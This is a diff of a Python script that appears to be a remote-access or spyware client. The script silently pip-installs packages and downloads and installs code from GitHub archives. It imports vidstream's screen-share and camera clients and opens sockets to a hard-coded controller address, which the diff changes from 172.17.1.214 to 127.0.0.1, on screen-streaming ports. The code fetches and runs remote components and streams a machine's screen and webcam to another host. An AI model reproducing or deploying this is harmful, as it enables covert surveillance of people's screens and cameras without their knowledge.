@@ -1,6 +1,7 @@
 import socket
 import zipfile, os, shutil, time, subprocess
 from turtle import left
+
 tryit = False
 while tryit == False:
     try:
@@ -8,12 +9,15 @@ while tryit == False:
         tryit = True
     except:
         subprocess.Popen("py -m pip install pyautogui", shell=True)
-        time.sleep(1)
-try:
-    import requests
-except:
-    subprocess.Popen("py -m pip install requests", shell=True)
-    import requests
+        time.sleep(5)
+tryit = False
+while tryit == False:
+    try:
+        import requests
+        tryit = True
+    except:
+        subprocess.Popen("py -m pip install requests", shell=True)
+        time.sleep(5)
     
 def getpath(change=False):
     if change in (False, "not", "\\"):
@@ -50,21 +54,29 @@ def moveFileFromDir(data, file="modif.py"):
     fichiers.append(file)
     for f in range(len(fichiers)):
         if fichiers[f] != getFileName():
+            print(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
             shutil.copy(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
 
-try:
-    from vidstream import ScreenShareClient
-    from vidstream import CameraClient
-except:
-    dir = "wlh-main"
-    downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
-    moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
-    supDir(dir)
-    subprocess.Popen("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
-    subprocess.Popen("py -m pip install vidstream", shell=True)
-    os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
-    from vidstream import ScreenShareClient
-    from vidstream import CameraClient
+tryit = False
+while tryit == False:
+    try:
+        from vidstream import ScreenShareClient
+        from vidstream import CameraClient
+        tryit = True
+    except:
+        dir = "whl-main"
+        downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
+        time.sleep(5)
+        moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
+        supDir(dir)
+        time.sleep(5)
+        subprocess.Popen("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
+        time.sleep(5)
+        subprocess.Popen("py -m pip install vidstream", shell=True)
+        time.sleep(5)
+        os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
+        time.sleep(5)
+        
 
 
 url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
@@ -140,12 +152,12 @@ while run == True:
         os.system(getFileName())
     sortir = True
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("172.17.1.214", 22223))
+    s.connect(("127.0.0.1", 22223))
     ip = s.getsockname()[0]
     port = 22223
     s.close()
     
-    ipScreen = "172.17.1.214"
+    ipScreen = "127.0.0.1"
     port = 22228
     
     
